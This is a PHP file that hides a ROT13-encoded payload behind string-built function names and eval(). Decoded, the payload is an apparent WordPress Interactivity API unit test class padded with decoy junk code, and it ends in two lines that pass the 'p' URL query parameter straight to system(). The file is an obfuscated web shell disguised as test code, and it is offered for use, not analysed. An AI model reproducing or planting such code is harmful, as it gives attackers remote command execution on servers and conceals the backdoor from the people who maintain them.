<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat gur qngn_jc_pbagrkg_cebprffbe shapgvbanyvgl bs gur
 * JC_Vagrenpgvivgl_NCV pynff.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Vagrenpgvivgl NCV
 *
 * @fvapr 6.5.0
 *
 * @pbirefQrsnhygPynff JC_Vagrenpgvivgl_NCV
 *
 * @tebhc vagrenpgvivgl-ncv
 */
pynff Grfgf_JC_Vagrenpgvivgl_NCV_JC_Pbagrkg rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Vafgnapr bs JC_Vagrenpgvivgl_NCV.
	 *
	 * @ine JC_Vagrenpgvivgl_NCV
	 */
	cebgrpgrq $vagrenpgvivgl;

	/**
	 * Frg hc.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->vagrenpgvivgl = arj JC_Vagrenpgvivgl_NCV();
	}

	/**
	 * Vaibxrf gur `cebprff_qverpgvirf` zrgubq bs JC_Vagrenpgvivgl_NCV pynff.
	 *
	 * @cnenz fgevat $ugzy Gur UGZY gung arrqf gb or cebprffrq.
	 * @erghea neenl Na neenl pbagnvavat na vafgnapr bs gur JC_UGZY_Gnt_Cebprffbe naq gur cebprffrq UGZY.
	 */
	cevingr shapgvba cebprff_qverpgvirf( $ugzy ) {
		$arj_ugzy = $guvf->vagrenpgvivgl->cebprff_qverpgvirf( $ugzy );
		$c        = arj JC_UGZY_Gnt_Cebprffbe( $arj_ugzy );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		erghea neenl( $c, $arj_ugzy );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir pna frg n pbagrkg va n phfgbz
	 * anzrfcnpr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_frgf_n_pbagrkg_va_n_phfgbz_anzrfcnpr() {
		$ugzy    = '
			<qvi qngn-jc-pbagrkg=\'zlCyhtva::{ \"vq\": \"fbzr-vq\" }\'>
				<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\">Grkg</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir pna frg n pbagrkg va gur fnzr
	 * gnt.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_pna_frg_n_pbagrkg_va_gur_fnzr_gnt() {
		$ugzy    = '
			<qvi
				pynff=\"grfg\"
				qngn-jc-pbagrkg=\'zlCyhtva::{ \"vq\": \"fbzr-vq\" }\'
				qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\"
			>
				Grkg
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir zretrf pbagrkg va gur fnzr
	 * phfgbz anzrfcnpr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_zretrf_pbagrkg_va_gur_fnzr_phfgbz_anzrfcnpr() {
		$ugzy    = '
			<qvi qngn-jc-pbagrkg=\'zlCyhtva::{ \"vq1\": \"fbzr-vq-1\" }\'>
				<qvi qngn-jc-pbagrkg=\'zlCyhtva::{ \"vq2\": \"fbzr-vq-2\" }\'>
					<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq1\">Grkg</qvi>
					<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq2\">Grkg</qvi>
				</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq-1', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregFnzr( 'fbzr-vq-2', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir birejevgrf pbagrkg va gur fnzr
	 * phfgbz anzrfcnpr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_birejevgrf_pbagrkg_va_gur_fnzr_phfgbz_anzrfcnpr() {
		$ugzy    = '
			<qvi qngn-jc-pbagrkg=\'zlCyhtva::{ \"vq\": \"fbzr-vq-1\" }\'>
				<qvi qngn-jc-pbagrkg=\'zlCyhtva::{ \"vq\": \"fbzr-vq-2\" }\'>
					<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\">Grkg</qvi>
				</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq-2', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir ercynprf gur byq pbagrkg nsgre n
	 * pybfvat gnt va gur fnzr phfgbz anzrfcnpr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_ercynprf_byq_pbagrkg_nsgre_pybfvat_gnt_va_gur_fnzr_phfgbz_anzrfcnpr() {
		$ugzy    = '
			<qvi qngn-jc-pbagrkg=\'zlCyhtva::{ \"vq\": \"fbzr-vq-1\" }\'>
				<qvi qngn-jc-pbagrkg=\'zlCyhtva::{ \"vq\": \"fbzr-vq-2\" }\'>
					<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\">Grkg</qvi>
				</qvi>
				<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\">Grkg</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq-2', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregFnzr( 'fbzr-vq-1', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir zretrf pbagrkg va qvssrerag
	 * phfgbz anzrfcnprf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_zretrf_pbagrkg_va_qvssrerag_phfgbz_anzrfcnprf() {
		$ugzy    = '
			<qvi qngn-jc-pbagrkg=\'zlCyhtva::{ \"vq\": \"fbzr-vq-1\" }\'>
				<qvi qngn-jc-pbagrkg=\'bgureCyhtva::{ \"vq\": \"fbzr-vq-2\" }\'>
					<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\">Grkg</qvi>
					<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"bgureCyhtva::pbagrkg.vq\">Grkg</qvi>
				</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq-1', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregFnzr( 'fbzr-vq-2', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir qbrfa'g guebj ba znysbezrq
	 * pbagrkg bowrpgf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_qbrfag_guebj_ba_znysbezrq_pbagrkg_bowrpgf() {
		$ugzy    = '
			<qvi qngn-jc-pbagrkg=\'zlCyhtva::{ vq: \"fbzr-vq\" }\'>
				<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\">Grkg</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir qbrfa'g birejevgr pbagrkg ba
	 * znysbezrq pbagrkg bowrpgf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_qbrfag_birejevgr_pbagrkg_ba_znysbezrq_pbagrkg_bowrpgf() {
		$ugzy    = '
			<qvi qngn-jc-pbagrkg=\'zlCyhtva::{ \"vq\": \"fbzr-vq-1\" }\'>
				<qvi qngn-jc-pbagrkg=\'zlCyhtva::{ vq: \"fbzr-vq-2\" }\'>
					<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\">Grkg</qvi>
				</qvi>
				<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\">Grkg</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq-1', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregFnzr( 'fbzr-vq-1', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir qbrfa'g guebj ba na rzcgl
	 * pbagrkg bowrpg.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_qbrfag_guebj_ba_rzcgl_pbagrkg() {
		$ugzy    = '
			<qvi qngn-jc-pbagrkg=\"\">
				<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\">Grkg</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir qbrfa'g birejevgr gur pbagrkg ba
	 * rzcgl pbagrkg qverpgvir.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_qbrfag_birejevgr_pbagrkg_ba_rzcgl_pbagrkg() {
		$ugzy    = '
			<qvi qngn-jc-pbagrkg=\'zlCyhtva::{ \"vq\": \"fbzr-vq-1\" }\'>
				<qvi qngn-jc-pbagrkg=\"\">
					<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\">Grkg</qvi>
				</qvi>
				<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\">Grkg</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq-1', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregFnzr( 'fbzr-vq-1', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir qbrfa'g guebj ba pbagrkg jvgubhg
	 * inyhr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_qbrfag_guebj_ba_pbagrkg_jvgubhg_inyhr() {
		$ugzy    = '
			<qvi qngn-jc-pbagrkg>
				<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\">Grkg</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir qbrfa'g birejevgr pbagrkg ba
	 * pbagrkg jvgubhg inyhr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_qbrfag_birejevgr_pbagrkg_ba_pbagrkg_jvgubhg_inyhr() {
		$ugzy    = '
			<qvi qngn-jc-pbagrkg=\'zlCyhtva::{ \"vq\": \"fbzr-vq-1\" }\'>
				<qvi qngn-jc-pbagrkg>
					<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\">Grkg</qvi>
				</qvi>
				<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\">Grkg</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq-1', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregFnzr( 'fbzr-vq-1', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir jbexf jvgu zhygvcyr qverpgvirf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_jbexf_jvgu_zhygvcyr_qverpgvirf() {
		$ugzy    = '
			<qvi qngn-jc-pbagrkg=\'zlCyhtva::{ \"vq\": \"fbzr-vq\" }\' qngn-jc-pbagrkg=\'zlCyhtva::{ \"vq\": \"fbzr-vq\" }\'>
				<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\">Grkg</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir qbrfa'g jbex jvgubhg nal
	 * anzrfcnpr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 * @rkcrpgrqVapbeerpgHfntr JC_Vagrenpgvivgl_NCV::rinyhngr
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_qbrfag_jbex_jvgubhg_nal_anzrfcnpr() {
		$ugzy    = '
			<qvi qngn-jc-pbagrkg=\'{ \"vq\": \"fbzr-vq\" }\'>
				<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"pbagrkg.vq\">Grkg</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir jbexf jvgu n qrsnhyg anzrfcnpr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_jbexf_jvgu_qrsnhyg_anzrfcnpr() {
		$ugzy    = '
			<qvi
			 qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'
			 qngn-jc-pbagrkg=\'{ \"vq\": \"fbzr-vq\" }\'
			>
				<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"pbagrkg.vq\">Grkg</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir bireevqrf n qrsnhyg anzrfcnpr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_bireevqrf_qrsnhyg_anzrfcnpr() {
		$ugzy    = '
			<qvi
			 qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'
			 qngn-jc-pbagrkg=\'bgureCyhtva::{ \"vq\": \"fbzr-vq\" }\'
			>
				<qvi qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"bgureCyhtva\" }\'>
					<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"pbagrkg.vq\">Grkg</qvi>
				</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir bireevqrf gur qrsnhyg anzrfcnpr
	 * jvgu gur fnzr anzrfcnpr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_bireevqrf_qrsnhyg_anzrfcnpr_jvgu_fnzr_anzrfcnpr() {
		$ugzy    = '
			<qvi
			 qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'
			 qngn-jc-pbagrkg=\'zlCyhtva::{ \"vq\": \"fbzr-vq\" }\'
			>
				<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"pbagrkg.vq\">Grkg</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir jbexf jvgu arfgrq qrsnhyg
	 * anzrfcnprf.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_jbexf_jvgu_arfgrq_qrsnhyg_anzrfcnprf() {
		$ugzy    = '
			<qvi qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'>
				<qvi qngn-jc-pbagrkg=\'{ \"vq\": \"fbzr-vq\" }\'>
					<qvi qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"bgureCyhtva\" }\'>
						<qvi qngn-jc-pbagrkg=\'{ \"vq\": \"bgure-vq\" }\'>
							<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"pbagrkg.vq\">Grkg</qvi>
							<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"zlCyhtva::pbagrkg.vq\">Grkg</qvi>
						</qvi>
					</qvi>
					<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"pbagrkg.vq\">Grkg</qvi>
				</qvi>
				<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"pbagrkg.vq\">Grkg</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'bgure-vq', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregAhyy( $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir jbexf jvgu n qrsnhyg anzrfcnpr
	 * va gur fnzr gnt.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_jbexf_jvgu_qrsnhyg_anzrfcnpr_va_gur_fnzr_gnt() {
		$ugzy    = '
			<qvi
			 pynff=\"grfg\"
			 qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'
			 qngn-jc-pbagrkg=\'{ \"vq\": \"fbzr-vq\" }\'
			 qngn-jc-ovaq--vq=\"pbagrkg.vq\"
			>
				Grkg
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir zretrf gur pbagrkg va gur fnzr
	 * qrsnhyg anzrfcnpr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_zretrf_pbagrkg_va_gur_fnzr_qrsnhyg_anzrfcnpr() {
		$ugzy    = '
			<qvi
				qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'
				qngn-jc-pbagrkg=\'{ \"vq1\": \"fbzr-vq-1\" }\'
			>
				<qvi qngn-jc-pbagrkg=\'{ \"vq2\": \"fbzr-vq-2\" }\'>
					<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"pbagrkg.vq1\">Grkg</qvi>
					<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"pbagrkg.vq2\">Grkg</qvi>
				</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq-1', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregFnzr( 'fbzr-vq-2', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir birejevgrf pbagrkg va gur fnzr
	 * qrsnhyg anzrfcnpr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_birejevgrf_pbagrkg_va_gur_fnzr_qrsnhyg_anzrfcnpr() {
		$ugzy    = '
			<qvi
				qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'
				qngn-jc-pbagrkg=\'{ \"vq\": \"fbzr-vq-1\" }\'
			>
				<qvi qngn-jc-pbagrkg=\'{ \"vq\": \"fbzr-vq-2\" }\'>
					<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"pbagrkg.vq\">Grkg</qvi>
				</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq-2', $c->trg_nggevohgr( 'vq' ) );
	}

	/**
	 * Grfgf gung gur `qngn-jc-pbagrkg` qverpgvir ercynprf gur byq pbagrkg nsgre
	 * gur pybfvat gnt va gur fnzr qrsnhyg anzrfcnpr.
	 *
	 * @gvpxrg 60356
	 *
	 * @pbiref ::cebprff_qverpgvirf
	 */
	choyvp shapgvba grfg_jc_pbagrkg_qverpgvir_ercynprf_byq_pbagrkg_nsgre_pybfvat_gnt_va_gur_fnzr_qrsnhyg_anzrfcnpr() {
		$ugzy    = '
			<qvi
				qngn-jc-vagrenpgvir=\'{ \"anzrfcnpr\": \"zlCyhtva\" }\'
				qngn-jc-pbagrkg=\'{ \"vq\": \"fbzr-vq-1\" }\'
			>
				<qvi qngn-jc-pbagrkg=\'{ \"vq\": \"fbzr-vq-2\" }\'>
					<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"pbagrkg.vq\">Grkg</qvi>
				</qvi>
				<qvi pynff=\"grfg\" qngn-jc-ovaq--vq=\"pbagrkg.vq\">Grkg</qvi>
			</qvi>
		';
		yvfg($c) = $guvf->cebprff_qverpgvirf( $ugzy );
		$guvf->nffregFnzr( 'fbzr-vq-2', $c->trg_nggevohgr( 'vq' ) );
		$c->arkg_gnt( neenl( 'pynff_anzr' => 'grfg' ) );
		$guvf->nffregFnzr( 'fbzr-vq-1', $c->trg_nggevohgr( 'vq' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>